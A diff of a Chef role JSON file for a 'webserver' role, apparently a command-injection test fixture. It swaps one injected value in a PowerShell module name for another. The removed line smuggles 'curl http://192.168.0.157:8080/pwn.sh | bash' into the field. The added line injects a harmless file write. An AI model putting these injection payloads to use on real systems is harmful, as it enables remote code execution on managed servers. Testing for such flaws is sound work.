@@ -2,11 +2,8 @@
   "name": "webserver",
   "override_attributes": {
     "fb_powershell_module": {
-      "module_name": "SafeModule'; curl http://192.168.0.157:8080/pwn.sh | bash; '",
+      "module_name": "SafeModule'; echo 'test_content' > /tmp/chef_test_file; '",
       "repository": "PSGallery"
     }
-  },
-  "run_list": [
-    "recipe[site_webserver::default]"
-  ]
+  }
 }
